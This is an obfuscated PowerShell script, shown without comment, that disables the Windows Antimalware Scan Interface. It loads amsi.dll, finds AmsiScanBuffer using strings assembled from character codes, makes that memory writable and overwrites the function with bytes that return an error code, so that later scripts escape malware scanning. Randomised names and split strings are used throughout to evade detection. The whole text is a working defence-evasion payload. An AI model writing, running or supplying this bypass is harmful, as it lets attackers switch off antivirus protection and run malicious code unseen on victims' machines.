$a1pYfvpBCHx = @"
using System;
using System.Runtime.InteropServices;
public class a1pYfvpBCHx {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Oe6D34vDQiikh, string Td4MRxAaiW7lUyNEn);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr xWagfwWpoV1, UIntPtr JeeQxzoPF7zXoXPmf, uint HtbcsM, out uint BFJLbW7uYW);
}
"@

Add-Type $a1pYfvpBCHx

$UBx = [a1pYfvpBCHx]::LoadLibrary("$(('á'+'m'+'s'+'í'+'.'+'d'+'l'+'l').nOrmAlIze([ChAR](70*4/4)+[cHAR]([BYte]0x6f)+[CHAr](114)+[ChaR](109)+[cHaR](68+59-59)) -replace [ChAR]([BYTE]0x5c)+[chAr]([ByTe]0x70)+[cHAr]([bytE]0x7b)+[cHar]([bYte]0x4d)+[CHar]([bYte]0x6e)+[cHar](125))")
$t1d80zCOHx = [a1pYfvpBCHx]::GetProcAddress($UBx, "$([CHaR](65)+[chAR]([byTE]0x6d)+[chAR](115)+[cHaR](105+13-13)+[chAr](83+23-23)+[cHaR]([BYte]0x63)+[cHar]([bYTE]0x61)+[ChaR]([bYte]0x6e)+[cHar](66+40-40)+[CHar]([bytE]0x75)+[char]([byTe]0x66)+[chAr](102+11-11)+[chaR](101)+[cHAr]([bYtE]0x72))")
$p = 0
[a1pYfvpBCHx]::VirtualProtect($t1d80zCOHx, [uint32]5, 0x40, [ref]$p)
$r2mXs5Q6CT6t8iioHh = "0xB8"
$UKB2WQt9SGGqoVF = "0x57"
$rM3 = "0x00"
$HyMRv8BA41mBu = "0x07"
$xHQ = "0x80"
$r7Gx3Jm1K9OL6oWVQ = "0xC3"
$giKkJ = [Byte[]] ($r2mXs5Q6CT6t8iioHh,$UKB2WQt9SGGqoVF,$rM3,$HyMRv8BA41mBu,+$xHQ,+$r7Gx3Jm1K9OL6oWVQ)
[System.Runtime.InteropServices.Marshal]::Copy($giKkJ, 0, $t1d80zCOHx, 6)